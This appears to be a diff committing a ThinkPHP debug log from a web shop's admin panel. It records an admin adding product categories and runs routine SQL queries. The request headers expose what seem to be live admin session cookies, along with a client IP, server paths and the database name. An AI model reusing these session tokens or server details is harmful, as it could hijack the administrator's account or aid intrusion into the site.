+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.005853s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.005865s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005545s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001125s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000336s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.000824s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000334s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.000689s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000398s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000876s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000336s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000344s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.000817s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `parent_id` = '0' [ RunTime:0.000667s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:08:53+08:00 ] 179.134.4.167 GET aosuper.com/login.php/newsad/prolist?page=1&limit=15
+[运行时间：0.041023s] [吞吐率：24.38req/s] [内存消耗：2,748.44kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'prolist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=product',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '15',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->prolist[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000732s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `product` [ RunTime:0.001278s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `status` LIKE '%%'  AND `hsz` = 'Normal' ORDER BY `Id` DESC [ RunTime:0.008809s ]
+[ sql ] [ SQL ] SELECT * FROM `product` WHERE  `status` LIKE '%%'  AND `hsz` = 'Normal' ORDER BY `Id` DESC LIMIT 0,15 [ RunTime:0.001005s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:08+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/selclass?formnam=productc&selname=COZINHA
+[运行时间：0.028070s] [吞吐率：35.62req/s] [内存消耗：2,712.43kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'selclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formnam' => 'productc',
+  'selname' => 'COZINHA',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->selclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000701s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001171s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `name` LIKE '%COZINHA%' [ RunTime:0.000835s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:12+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/addclass
+[运行时间：0.028462s] [吞吐率：35.13req/s] [内存消耗：2,683.23kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'addclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '95',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'name' => 'MOEDOR DE CAFÉ',
+  'laug' => '简体中文',
+  'topid' => '2138',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->addclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000862s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001098s ]
+[ sql ] [ SQL ] INSERT INTO `productc` (`name` , `laug` , `parent_id` , `create_time` , `sort`) VALUES ('MOEDOR DE CAFÉ' , '简体中文' , '2138' , '2024-06-13 00:15:12' , 0) [ RunTime:0.000387s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:14+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc
+[运行时间：0.486062s] [吞吐率：2.06req/s] [内存消耗：3,439.85kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'iframe',
+  'sec-fetch-user' => '?1',
+  'sec-fetch-mode' => 'navigate',
+  'sec-fetch-site' => 'same-origin',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'sec-ch-ua-platform' => '"Windows"',
+  'sec-ch-ua-mobile' => '?0',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'host' => 'aosuper.com',
+  'content-length' => '',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'page' => 'newsclass',
+  'formname' => 'productc',
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\admin\controller\Admin->loadright[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Admin.php ]
+[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/admin/view/admin/page/newsclass.html [ array (
+  0 => 'languageObj',
+  1 => 'language',
+  2 => 'userid',
+  3 => 'user',
+  4 => 'password',
+  5 => 'ico',
+  6 => 'username',
+  7 => 'companyname',
+  8 => 'webname',
+  9 => 'domain',
+  10 => 'Address',
+  11 => 'person',
+  12 => 'mobile',
+  13 => 'qq',
+  14 => 'Introduction',
+  15 => 'tippw',
+  16 => 'weblogo',
+  17 => 'seowebname',
+  18 => 'seowebdomain',
+  19 => 'seoseotitle',
+  20 => 'seoseokey',
+  21 => 'seoseodsc',
+  22 => 'seoseoheader',
+  23 => 'jstwo',
+  24 => 'jsone',
+  25 => 'url',
+  26 => 'danyecon',
+  27 => 'num',
+  28 => 'webdomain',
+  29 => 'appid',
+  30 => 'miyao',
+  31 => 'fxtit',
+  32 => 'fxms',
+  33 => 'wxtit',
+  34 => 'Hamtime',
+  35 => 'photo',
+  36 => 'wxms',
+  37 => 'photowx',
+  38 => 'viewUV',
+  39 => 'loginnum',
+  40 => 'alluv',
+  41 => 'allmb',
+  42 => 'allorder',
+  43 => 'allkc',
+  44 => 'acviewnum',
+  45 => 'pdviewnum',
+  46 => 'notes',
+  47 => 'formname',
+) ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000701s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.001070s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005951s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `language` [ RunTime:0.001009s ]
+[ sql ] [ SQL ] SELECT * FROM `language` ORDER BY `create_at` DESC [ RunTime:0.001427s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webpv` > 0 ORDER BY `Id` DESC [ RunTime:0.046257s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `member` [ RunTime:0.004046s ]
+[ sql ] [ SQL ] SELECT * FROM `member` ORDER BY `Id` DESC [ RunTime:0.000577s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `order` [ RunTime:0.000984s ]
+[ sql ] [ SQL ] SELECT * FROM `order` ORDER BY `Id` DESC [ RunTime:0.004724s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `news` [ RunTime:0.001141s ]
+[ sql ] [ SQL ] SELECT * FROM `news` ORDER BY `Id` DESC [ RunTime:0.000405s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-01'  AND `webpv` > 0 [ RunTime:0.007733s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-02'  AND `webpv` > 0 [ RunTime:0.008289s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-03'  AND `webpv` > 0 [ RunTime:0.007015s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-04'  AND `webpv` > 0 [ RunTime:0.007030s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-05'  AND `webpv` > 0 [ RunTime:0.007015s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-06'  AND `webpv` > 0 [ RunTime:0.007008s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-07'  AND `webpv` > 0 [ RunTime:0.009450s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08'  AND `webpv` > 0 [ RunTime:0.012049s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09'  AND `webpv` > 0 [ RunTime:0.009140s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-10'  AND `webpv` > 0 [ RunTime:0.006731s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-11'  AND `webpv` > 0 [ RunTime:0.006894s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-12'  AND `webpv` > 0 [ RunTime:0.010087s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-01' [ RunTime:0.008749s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-02' [ RunTime:0.006166s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-03' [ RunTime:0.006346s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-04' [ RunTime:0.006260s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-05' [ RunTime:0.006057s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-06' [ RunTime:0.006084s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-07' [ RunTime:0.006011s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-08' [ RunTime:0.005943s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-09' [ RunTime:0.006516s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-10' [ RunTime:0.006551s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-11' [ RunTime:0.006119s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `name` > ''  AND `viewtime` = '2024-12' [ RunTime:0.006753s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006463s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.006267s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.006344s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.006243s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.006575s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.006472s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.007019s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.006680s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.007360s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006687s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006823s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `acview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006757s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-01' [ RunTime:0.006106s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-02' [ RunTime:0.005986s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-03' [ RunTime:0.005874s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-04' [ RunTime:0.005718s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-05' [ RunTime:0.005951s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-06' [ RunTime:0.005866s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-07' [ RunTime:0.005784s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-08' [ RunTime:0.005863s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-09' [ RunTime:0.006071s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-10' [ RunTime:0.006050s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-11' [ RunTime:0.006058s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `pdview` > 0  AND `viewtime` = '2024-12' [ RunTime:0.006046s ]
+[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `ucookie` = '1505630090' [ RunTime:0.005941s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001077s ]
+[ sql ] [ SQL ] SELECT * FROM `user` WHERE  `user` = 'admin' [ RunTime:0.000364s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `seo` [ RunTime:0.002840s ]
+[ sql ] [ SQL ] SELECT * FROM `seo` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000363s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `webplug` [ RunTime:0.001443s ]
+[ sql ] [ SQL ] SELECT * FROM `webplug` WHERE  `Id` = 1 LIMIT 1 [ RunTime:0.000369s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `danyecon` [ RunTime:0.000746s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` [ RunTime:0.000247s ]
+[ sql ] [ SQL ] SELECT * FROM `danyecon` WHERE  `class` = '备忘录' [ RunTime:0.000213s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:15+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/newsTree
+[运行时间：0.103881s] [吞吐率：9.63req/s] [内存消耗：3,811.20kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'newsTree',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '34',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'page' => '1',
+  'limit' => '500',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->newsTree[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000664s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001146s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` [ RunTime:0.001314s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:38+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/selclass?formnam=productc&selname=MOEDOR
+[运行时间：0.027477s] [吞吐率：36.39req/s] [内存消耗：2,711.99kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'selclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept' => '*/*',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '0',
+  'host' => 'aosuper.com',
+  'content-type' => '',
+)
+[ info ] [ PARAM ] array (
+  'formnam' => 'productc',
+  'selname' => 'MOEDOR',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->selclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000707s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001087s ]
+[ sql ] [ SQL ] SELECT * FROM `productc` WHERE  `name` LIKE '%MOEDOR%' [ RunTime:0.000844s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:40+08:00 ] 179.134.4.167 POST aosuper.com/login.php/newsad/addclass
+[运行时间：0.028438s] [吞吐率：35.16req/s] [内存消耗：2,683.19kb] [文件加载：48]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'newsad',
+    2 => 'addclass',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=1, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
+  'referer' => 'https://aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc',
+  'sec-fetch-dest' => 'empty',
+  'sec-fetch-mode' => 'cors',
+  'sec-fetch-site' => 'same-origin',
+  'origin' => 'https://aosuper.com',
+  'sec-ch-ua-platform' => '"Windows"',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'sec-ch-ua-mobile' => '?0',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'sec-ch-ua' => '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+  'content-length' => '82',
+  'host' => 'aosuper.com',
+)
+[ info ] [ PARAM ] array (
+  'name' => 'MANUAL',
+  'laug' => '简体中文',
+  'topid' => '2141',
+  'formname' => 'productc',
+)
+[ info ] [ RUN ] app\admin\controller\Newsad->addclass[ /www/wwwroot/tb.youanfutang.cn/application/admin/controller/Newsad.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000699s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `productc` [ RunTime:0.001078s ]
+[ sql ] [ SQL ] INSERT INTO `productc` (`name` , `laug` , `parent_id` , `create_time` , `sort`) VALUES ('MANUAL' , '简体中文' , '2141' , '2024-06-13 00:15:40' , 0) [ RunTime:0.000391s ]
+---------------------------------------------------------------
+[ 2024-06-13T00:15:42+08:00 ] 179.134.4.167 GET aosuper.com/login.php/admin/loadright?page=newsclass&formname=productc
+[运行时间：0.444084s] [吞吐率：2.25req/s] [内存消耗：3,439.85kb] [文件加载：53]
+[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
+[ info ] [ BIND ] 'admin'
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'admin',
+    2 => 'loadright',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'think_usercookie=1505630090; think_username=admin; language=pt; PHPSESSID=932nevgbah75qp9gsejg6tmp73; think_memcookie=890683432; think_user=A',
+  'priority' => 'u=0, i',
+  'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+  'accept-encoding' => 'gzip, deflate, br, zstd',
